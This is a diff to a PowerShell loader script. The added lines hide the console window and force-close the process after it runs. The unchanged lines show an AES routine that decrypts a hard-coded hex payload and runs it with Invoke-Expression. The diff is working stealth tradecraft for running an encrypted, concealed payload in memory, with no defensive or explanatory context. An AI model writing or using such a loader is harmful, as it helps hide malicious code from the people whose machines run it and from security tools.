@@ -1,3 +1,18 @@
+# HIDE PowerShell Window Immediately
+$hwnd = (Get-Process -Id $pid).MainWindowHandle
+if ($hwnd -ne 0) {
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class WinUtil {
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    }
+"@
+    [WinUtil]::ShowWindow($hwnd, 0)  # 0 = Hide window
+}
+
+# AES Decryption Function
 function Decrypt-Payload($hexString, $keyHex) {
     function ConvertFrom-Hex($hexString) {
         return -split ($hexString -replace '..', '0x$& ')
@@ -27,3 +42,7 @@ $encryptedHex = "9559530cc7ccb0e7f42c9979ab38a5ed6c9f5195a357c52f9b3e6b10466821d
 # Decrypt and execute
 $decryptedPayload = Decrypt-Payload $encryptedHex $keyHex
 Invoke-Expression $decryptedPayload
+
+# CLOSE PowerShell Window After Execution
+Start-Sleep -Seconds 2
+Stop-Process -Id $pid -Force
